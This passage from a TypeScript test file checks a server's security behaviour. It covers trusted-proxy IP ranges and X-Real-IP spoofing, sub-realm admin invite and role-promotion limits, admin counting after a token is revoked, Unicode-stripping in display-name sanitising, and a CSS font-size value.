        body: rawBody,
      });
      expect(badResp.status, `body=${rawBody} must return 400`).toBe(400);
    }

    // 4c. Exact CIDR private proxy check (`net.BlockList`): public 172.32.0.1 NOT trusted, private 172.16.0.5 IS trusted
    expect(isTrustedProxyIp("172.32.0.1")).toBe(false);
    expect(isTrustedProxyIp("172.15.255.254")).toBe(false);
    expect(isTrustedProxyIp("::ffff:172.32.0.1")).toBe(false);
    expect(isTrustedProxyIp("8.8.8.8")).toBe(false);
    expect(isTrustedProxyIp("172.16.0.5")).toBe(true);
    expect(isTrustedProxyIp("172.31.255.254")).toBe(true);
    expect(isTrustedProxyIp("::ffff:172.16.0.5")).toBe(true);
    expect(isTrustedProxyIp("127.0.0.1")).toBe(true);
    expect(isTrustedProxyIp("10.1.2.3")).toBe(true);
    expect(isTrustedProxyIp("192.168.1.10")).toBe(true);
    expect(isTrustedProxyIp("::1")).toBe(true);
    expect(isTrustedProxyIp("fc00::1")).toBe(true);
    expect(isTrustedProxyIp("fe80::1")).toBe(true);

    const spoofReq = {
      headers: { "x-real-ip": "1.2.3.4" },
      socket: { remoteAddress: "172.32.0.1" },
    } as unknown as http.IncomingMessage;
    expect(extractClientIp(spoofReq)).toBe("172.32.0.1");

    const trustedReq = {
      headers: { "x-real-ip": "203.0.113.9" },
      socket: { remoteAddress: "::ffff:172.16.0.5" },
    } as unknown as http.IncomingMessage;
    expect(extractClientIp(trustedReq)).toBe("203.0.113.9");

    // 4d. createInvite rejects role="admin" on a sub-realm (400 INVALID_INPUT)
    const badSubAdminInv = await fetch(`${srv.url}/v1/invites`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${adminTok.token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        actorId: "sub-admin",
        actorKind: "human",
        role: "admin",
        boundRealmRef: "/sub",
      }),
    });
    expect(badSubAdminInv.status).toBe(400);

    expect(() =>
      createInvite({
        db: srv.engine.db,
        orgId: srv.orgId,
        actorId: "sub-admin-2",
        actorKind: "human",
        actorRole: "admin",
        boundRealmRef: "/sub",
        createdBy: "admin",
      }),
    ).toThrow(/sub-realm/i);

    // Explicit root realm "/" admin invite STILL works
    const rootAdminInv = createInvite({
      db: srv.engine.db,
      orgId: srv.orgId,
      actorId: "root-admin-2",
      actorKind: "human",
      actorRole: "admin",
      boundRealmRef: "/",
      createdBy: "admin",
    });
    expect(rootAdminInv.record.actorRole).toBe("admin");

    // 4e. POST /v1/actors/role MUST reject promoting phantom/typo actor, agent-only actor, or sub-realm human
    for (const targetActorId of ["typo-phantom", "worker-bot", "scoped-alice"]) {
      const r = await fetch(`${srv.url}/v1/actors/role`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${adminTok.token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ actorId: targetActorId, role: "admin" }),
      });
      expect(r.status, `promoting ${targetActorId} to admin must return 400`).toBe(400);
    }
    // Phantom actor must NOT have been inserted into actors table
    expect(srv.engine.db.getActor(srv.orgId, "typo-phantom")).toBeNull();
    // Valid root-realm human CAN be promoted
    expect(scopedHumanTok.record.boundRealmId).toBe(subRealm.id);
    const rootBob = srv.createToken({ actorId: "root-bob", actorKind: "human" });
    expect(rootBob.record.actorId).toBe("root-bob");
    const goodPromo = await fetch(`${srv.url}/v1/actors/role`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${adminTok.token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ actorId: "root-bob", role: "admin" }),
    });
    expect(goodPromo.status).toBe(200);
    expect(srv.engine.db.countActiveAdmins(srv.orgId)).toBe(2);

    // Revoking root-bob's only token immediately excludes him from countActiveAdmins!
    srv.engine.db.revokeToken(srv.orgId, rootBob.record.id, new Date().toISOString());
    expect(srv.engine.db.countActiveAdmins(srv.orgId)).toBe(1);

    // Fresh local-only org with no tokens/identities still falls back safely
    const localDb = new SqliteDb({
      dbPath: path.join(makeTempDir("meru-v062-local-org-"), "mind.sqlite"),
      enableVector: false,
    });
    try {
      const now = new Date().toISOString();
      localDb.insertOrg({
        id: "org_local",
        name: "Local",
        isPersonalRoot: true,
        policy: "open",
        createdAt: now,
      });
      localDb.upsertActor({
        orgId: "org_local",
        actorId: "local-admin",
        role: "admin",
        nowIso: now,
      });
      localDb.upsertActor({
        orgId: "org_local",
        actorId: "local-member",
        role: "member",
        nowIso: now,
      });
      expect(localDb.countActiveAdmins("org_local")).toBe(1);
      // Local-only org uses the SAME eligibility rule in setActorRole & countActiveAdmins (even if an agent token exists)
      localDb.setActorRole("org_local", "local-member", "admin");
      expect(localDb.countActiveAdmins("org_local")).toBe(2);
      expect(() => localDb.setActorRole("org_local", "local-phantom", "admin")).toThrow(/active root-realm human/i);
    } finally {
      localDb.close();
    }

    // 4f. Unified sanitizeDisplayName: NFKC + strips Unicode tag chars U+E0001, C1 U+0085, ZWSP U+200B, U+2028/2029
    expect(sanitizeDisplayName("Alice\u{E0001}\u{E0041}\u0085\u200B\u202E\u2028\u2029")).toBe(
      "Alice",
    );
    expect(sanitizeDisplayName("\uFF21\uFF22\uFF23")).toBe("ABC"); // NFKC fullwidth -> ASCII
    expect(sanitizeDisplayName("🙂".repeat(70))).toBe("🙂".repeat(64)); // codepoint-safe slice
    const sqliteSrc = fs.readFileSync(
      path.resolve("src/adapters/sqlite-db.ts"),
      "utf8",
    );
    expect(sqliteSrc).not.toContain("\\u202a-\\u202e");

    // 4g. .profile-role-badge font-size is 11px (no 10.5px micro-font)
    const cssSrc = fs.readFileSync(path.resolve("src/ui/shell/styles.css"), "utf8");
    expect(cssSrc).not.toContain("font-size: 10.5px");
    expect(DEFAULT_SHELL_CSS).not.toContain("font-size: 10.5px");
    expect(DEFAULT_SHELL_CSS).toMatch(/\.profile-role-badge\s*\{[^}]*font-size:\s*11px;/);
  });
});
